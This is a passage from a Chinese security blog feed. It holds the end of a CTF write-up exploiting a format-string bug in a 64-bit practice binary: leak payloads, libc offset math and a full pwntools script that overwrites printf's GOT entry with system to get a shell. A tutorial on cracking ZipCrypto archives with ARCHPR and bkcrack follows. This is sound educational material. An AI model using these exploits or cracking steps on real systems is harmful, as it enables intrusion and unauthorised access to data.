class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_15.png" alt="你想有多PWN-fmt_test2_15.png"></p><hr><h1 id="fmt-str-level-1-x64"><a href="#fmt-str-level-1-x64" class="headerlink" title="fmt_str_level_1_x64"></a>fmt_str_level_1_x64</h1><blockquote><p>主要在 <em>“定位并泄露栈中的数据”</em> 和 <em>“利用 libc 偏移计算 system 地址”</em> 两节中与 32 位程序有所区别</p></blockquote><hr><h2 id="定位并泄露栈中的数据-1"><a href="#定位并泄露栈中的数据-1" class="headerlink" title="定位并泄露栈中的数据"></a>定位并泄露栈中的数据</h2><p>准备工作与前面一样，就不再详细说明了</p><p>首先调试 <code>fmt_str_level_1_x64</code> 程序，在 <code>read()</code> 处输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaaaaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看输出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_19.png" alt="你想有多PWN-fmt_test2_19.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaaaaaa_0x55555555600b_0x71_0xffffffff_0x6_0x7ffff7fc9040_0x6161616161616161_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0x255f70255f70255f_0xa70255f70_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 <code>0x6161616161616161</code> 位于第 6 个位置，即 RSP 所指向的位置（<mark>因为在 64 位程序中 printf 函数的前 6 个参数位于寄存器中，第 7 个参数才开始入栈；而 32 位程序 printf 函数的参数都存放在栈中，这是 64 位程序与 32 位程序不同的地方</mark>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_20.png" alt="你想有多PWN-fmt_test2_20.png"></p><p>与 32 位程序同理，计算可知栈中的返回地址位于：<code>6 + (0x7fffffffdad8 - 0x7fffffffd9c0) / 8 = 6 + 35 = 41</code></p><p>构造 <code>printf(%41$p)</code> 即可泄露出 <code>main+28</code> 的真实地址，于是 <code>main()</code> 的真实地址为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-ELF-的函数偏移计算真实地址-1"><a href="#利用-ELF-的函数偏移计算真实地址-1" class="headerlink" title="利用 ELF 的函数偏移计算真实地址"></a>利用 ELF 的函数偏移计算真实地址</h2><p>与 32 位一样，根据 ELF 的函数偏移地址计算 <code>puts_got_addr</code> 和 <code>printf_got_addr</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-libc-偏移计算-system-地址-1"><a href="#利用-libc-偏移计算-system-地址-1" class="headerlink" title="利用 libc 偏移计算 system 地址"></a>利用 libc 偏移计算 system 地址</h2><p>要使用 libc 计算偏移，首先需要知道一个调用自 libc 的函数的真实地址</p><p>这里还是选择通过 <code>puts_got_addr</code> 泄露真实 <code>puts()</code> 地址作为示例</p><blockquote><p><em>注意：这里与 32 位程序有所不同！！！</em></p><p><mark>如果依然使用类似于 32 位程序中的方法，在接收地址时会发生错误：</mark></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%6$s'</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>  puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然说我们接收到的数据 <code>0x3a7475706e69</code> 来自 <code>69 6e 70 75 74 3a</code>（小端序）没有问题，但实际上 <code>puts()</code> 的真实地址是错误的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_21.png" alt="你想有多PWN-fmt_test2_21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_22.png" alt="你想有多PWN-fmt_test2_22.png"></p><p>原因在于：</p><ul><li><strong>32 位程序的地址占 4 字节，通常 4 字节全部被使用</strong></li><li><strong>64 位程序的地址虽然占 8 字节，但通常只使用了其中的 6 字节</strong></li></ul><p>实际 <code>puts_got_addr</code> 的地址 <code>0x56c4b37f8020</code> 只使用了 6 字节，这就导致我们在发送 <code>p64(puts_got_addr)</code> 的时候，高位 2 字节被补为 <code>0x00</code>，最后的地址为：<code>0x000056c4b37f8020</code></p><p>即上图桃红色方框中的：<code>20 80 7f b3 c4 56 00 00</code>（小端序）</p><p>而这里的 <code>0x00</code> 会导致我们发送的 payload 被截断，因此无法达到 <code>printf(%6$s)</code> 的效果</p></blockquote><p>所以这里为了避免被截断，我们不能在 <code>%参数顺序$格式化说明符</code> 之前发送 <code>p64(puts_got_addr)</code></p><p>应该先发送 <code>%参数顺序$格式化说明符</code>，再发送 <code>p64(puts_got_addr)</code></p><p>于是栈中的结构应该变为：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_23.png" alt="你想有多PWN-fmt_test2_23.png"></p><p>因为先发送 <code>%参数顺序$格式化说明符</code>，所以 <code>p64(puts_got_addr)</code> 应该位于第 7 个位置，将原来的 <code>b&#39;%6$s&#39;</code> 改为 <code>b&#39;%7$s&#39;</code></p><p><strong>同时，64 位程序一个地址存放 8 字节，而 <code>b&#39;%7$s&#39;</code> 只有 4 字节，因此还需要填补 4 字节的垃圾数据，例如：<code>b&#39;%7$saaaa&#39;</code></strong></p><p>因此脚本应该改为：</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 此时泄漏的地址位于最开始，因此直接从第一个字节开始接收</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_24.png" alt="你想有多PWN-fmt_test2_24.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_25.png" alt="你想有多PWN-fmt_test2_25.png"></p><p>可以看到这次没有被 <code>0x00</code> 截断，<code>puts()</code> 的真实地址也是正确的</p><p>其他的基本与 32 位一样，最后使用 <code>fmtstr_payload()</code> 时将偏移改为 6 即可</p><h2 id="完整脚本-1"><a href="#完整脚本-1" class="headerlink" title="完整脚本"></a>完整脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 泄露并计算 main 函数真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 puts 函数的 GOT 表地址</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 此时泄漏的地址位于最开始，因此直接从第一个字节开始接收</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 puts 函数的真实地址与 libc 偏移计算 system 函数地址</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_26.png" alt="你想有多PWN-fmt_test2_26.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_27.png" alt="你想有多PWN-fmt_test2_27.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>明文攻击</title>
      <link href="/posts/3a71eb8.html"/>
      <url>/posts/3a71eb8.html</url>
      
        <content type="html"><![CDATA[<h1 id="zip-明文攻击"><a href="#zip-明文攻击" class="headerlink" title="zip 明文攻击"></a>zip 明文攻击</h1><blockquote><p>zip 明文攻击是针对加密 zip 压缩包的一种高效攻击手段，由于同一个 zip 压缩包里的所有文件都是使用同一个加密密钥来加密的，因此可以利用压缩包中的某个已知文件，在不知道解压密码的情况下还原出压缩包中的所有文件</p><p><em>zip 传统加密算法本质上是伪随机数流和明文进行异或，产生这个伪随机流需要用到 3 个 32 bits 的 key，找到这 3 个 key，就能解开加密的文件</em>。如果可以获得加密压缩包中的任意一个文件，用同样的压缩方法进行无密码的压缩，分析无密码 zip 和有密码 zip 的不同之处就能得到 3 个 key，进而在不知道解压密码的情况下获取加密压缩包中的文件</p></blockquote><h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><blockquote><p><strong>使用 ARCHPR 进行明文攻击时，首先需要确定明文文件与加密的 zip 压缩包中的文件是否为同一个文件</strong>，另外，<mark>压缩包要采用 ZipCrypto 类（如：Store）算法，不能采用 AES-256 加密</mark></p></blockquote><h3 id="确定明文文件"><a href="#确定明文文件" class="headerlink" title="确定明文文件"></a>确定明文文件</h3><p>例如，获取到一个没有密码的明文文件 <code>readme.txt</code>，且文件大小大于 12 Byte：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB2.png" alt="CTF-Misc_明文攻击2.png"></p><p>发现加密的压缩包 <code>Desktop.zip</code> 中同样有一个名为 <code>readme.txt</code> 的文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB3.png" alt="CTF-Misc_明文攻击3.png"></p><p><strong>为了确定它们是否是同一个文件，可以通过 WinRAR、7-Zip 等解压软件来查看 CRC 值</strong></p><p>可以看到加密的 <code>Desktop.zip</code> 中 <code>readme.txt</code> 的 CRC 值为 <code>E615BDA4</code>，算法为 <code>ZipCrypto Store</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB1.png" alt="CTF-Misc_明文攻击1.png"></p><p>然后将 <code>readme.txt</code> 压缩为 zip 压缩包（<em>需与加密压缩包内的 <code>readme.txt</code> 压缩格式一致</em>），文件名随意，我这里命名为 <code>readme.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB4.png" alt="CTF-Misc_明文攻击4.png"></p><p>可以看到这两个 <code>readme.txt</code> 文件的 CRC 值都是 <code>E615BDA4</code>，基本可以确定是同一个文件</p><hr><h3 id="使用-ARCHPR-明文攻击"><a href="#使用-ARCHPR-明文攻击" class="headerlink" title="使用 ARCHPR 明文攻击"></a>使用 ARCHPR 明文攻击</h3><p>打开 ARCHPR，选择明文攻击，导入对应文件</p><p><em>明文文件就是将 <code>readme.txt</code> 压缩后的 <code>readme.zip</code></em></p><blockquote><p>如果在使用明文攻击的时候，ARCHPR 出现这种报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在选定的档案中没有匹配的文件。如果您想要仅使用文件的一部分执行明文攻击，请修改档案，使每个档案中只包含一个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能是压缩软件的问题，<strong>构造明文压缩包时要选用与加密压缩包相同的压缩软件，例如加密压缩包是通过 WinRAR 压缩的，用 7-Zip 制作明文压缩包，可能会出现报错的情况</strong>，请尝试更换压缩软件</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB5.png" alt="CTF-Misc_明文攻击5.png"></p><blockquote><p><mark>注意：这里不需要等到 ARCHPR 破解的进度条走完</mark></p><p><strong>明文攻击时长一般在 5 - 10 分钟，运行至 5 分钟左右可以手动停止</strong></p></blockquote><p>如果手动停止时 ARCHPR 还没有找到密钥，则会显示“被用户终止”，此时只需再次点击“开始”，等待几分钟后再次手动停止，重复此操作</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB8.png" alt="CTF-Misc_明文攻击8.png"></p><p>如果手动停止时 ARCHPR 已经找到密钥，会弹出一个窗口，显示加密密钥的三个 key 值，我这里是 <code>[ df96dc88 b432ddfd df4b9e93 ]</code>，虽然文件口令未找到，但不要紧</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB6.png" alt="CTF-Misc_明文攻击6.png"></p><p>点击右边的确定后，ARCHPR 会自动弹出一个保存文件的窗口，文件名为 <code>Desktop_decrypted.zip</code>，这个压缩包就是去除了加密的 <code>Desktop.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB7.png" alt="CTF-Misc_明文攻击7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB9.png" alt="CTF-Misc_明文攻击9.png"></p><p>直接正常解压 <code>Desktop_decrypted.zip</code> 即可获得加密的 <code>Desktop.zip</code> 中的所有文件</p><hr><h2 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h2><blockquote><p>使用 bkcrack 可以不需要明文文件，只需要知道加密压缩包内容的连续 12 字节（至少 12 字节，知道得越多破解得越快），即可进行明文攻击，压缩包要采用 ZipCrypto 类（如：Store）算法</p><p>下载地址：<a href="https://github.com/kimci86/bkcrack/releases">kimci86&#x2F;bkcrack: Crack legacy zip encryption with Biham and Kocher’s known plaintext attack.</a></p></blockquote><p>常用参数：</p><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-L</td><td align="left">查看压缩包中的内容</td></tr><tr><td align="left">-C</td><td align="left">加密的压缩包</td></tr><tr><td align="left">-c</td><td align="left">压缩包内加密的文件（参照 <code>bkcrack -L</code> 中的 <code>Name</code> 项来写）</td></tr><tr><td align="left">-p</td><td align="left">明文内容（无需压缩为 zip）</td></tr><tr><td align="left">-k</td><td align="left">输入 key</td></tr><tr><td align="left">-x</td><td align="left">偏移量</td></tr><tr><td align="left">-d</td><td align="left">攻击完成后导出解密文件</td></tr><tr><td align="left">-U</td><td align="left">去除源密码按照指定的新密码保存压缩包</td></tr></tbody></table><ol><li>查看压缩包中的内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-L</span> zip压缩包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB10.png" alt="CTF-Misc_明文攻击10.png"></p><ol start="2"><li>根据明文文件获取加密压缩包的三个密钥 key</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-c</span> zip加密压缩包内的文件 <span class="token parameter variable">-p</span> 明文文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB11.png" alt="CTF-Misc_明文攻击11.png"></p><ol start="3"><li>还原加密压缩包中的内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-c</span> zip加密压缩包内的文件<span class="token punctuation">(</span>想要还原的<span class="token punctuation">)</span> <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-d</span> 还原后保存的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB12.png" alt="CTF-Misc_明文攻击12.png"></p><ol 